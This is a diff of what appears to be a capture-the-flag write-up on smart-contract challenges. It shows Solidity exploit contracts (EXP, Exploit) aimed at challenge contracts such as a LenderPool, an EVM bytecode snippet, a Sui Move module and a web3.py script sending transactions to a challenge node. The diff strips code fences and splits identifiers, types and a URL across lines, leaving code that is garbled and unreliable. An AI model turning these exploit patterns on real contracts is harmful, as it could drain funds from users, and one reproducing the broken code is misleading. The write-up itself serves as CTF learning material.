@@ -106,17 +106,7 @@ function isSolved() public view returns(bool){
 return flag;
 }
 }
-```
-
-
-
-```
 balanceOf[msg.sender] > 200000 && allowance[address(this)][msg.sender] > 200000)
-```
-
-
-
-```
 pragma solidity ^0.7.0;
 
 interface ExistingStock{
@@ -137,11 +127,6 @@ contract EXP{
     }
     
 }
-```
-
-
-
-```
 pragma solidity ^0.8.13;
 
 contract Deployer {
@@ -168,19 +153,9 @@ contract SmartCounter{
         return flag;
     }
 }
-```
-
-
-
-```
 CALLER
 PUSH1 0x00
 SSTORE
-```
-
-
-
-```
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
@@ -283,11 +258,6 @@ return flag;
 }
 
 }
-```
-
-
-
-```
 pragma solidity ^0.8.4;
 
 contract TEST {
@@ -316,11 +286,6 @@ contract TEST {
 
     }
 }
-```
-
-
-
-```
 contract LenderPool is ReentrancyGuard {
     using Address for address;
     IERC20 public immutable token0;
@@ -363,11 +328,6 @@ contract LenderPool is ReentrancyGuard {
     }
 
 }
-```
-
-
-
-```
 pragma solidity 0.8.16;
 
 interface  LenderPool{
@@ -398,16 +358,16 @@ contract EXP{
         victim.swap(victim.token1(), 100000000000000000000);
     }
 }
-```
-
-
-
-```
-module checkin::checkin {
-    use sui::object::{Self, UID};
-    use sui::transfer;
-    use sui::tx_context::{Self, TxContext};
-    use sui::event;
+module checkin::
+checkin {
+    use sui::
+object::{Self, UID};
+    use sui::
+transfer;
+    use sui::
+tx_context::{Self, TxContext};
+    use sui::
+event;
 
     struct Flag has copy, drop {
         user: address,
@@ -417,26 +377,24 @@ module checkin::checkin {
     fun init(ctx: &mut TxContext) {
     }
 
-    public entry fun HelloHackers(buffer: vector<u8>,ctx: &mut TxContext) {
+    public entry fun HelloHackers(buffer: vector,ctx: &mut TxContext) {
         let h=buffer;
         let value=b"hello";
         if(h == value){
-            event::emit(Flag {
-                user: tx_context::sender(ctx),
+            event::
+emit(Flag {
+                user: tx_context::
+sender(ctx),
                 flag: true
             });
         }
     }
 }
-```
-
-
-
-```
 from web3 import Web3
 from web3.middleware import geth_poa_middleware
 
-w3 = Web3(Web3.HTTPProvider("http://8.218.239.44:8545"))
+w3 = Web3(Web3.HTTPProvider("http://8.218.239.44:
+8545"))
 w3.middleware_onion.inject(geth_poa_middleware, layer=0)
 # 题目合约地址
 target = "0xf416D27823287FF4ae38C9A4678Ca7622E27A62E"
@@ -466,11 +424,6 @@ tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 
 print(tx_hash)
 print(tx_receipt)
-```
-
-
-
-```
 contract Exploit{
     SignedByowner[] public sbarray;
     Wallet public wl;
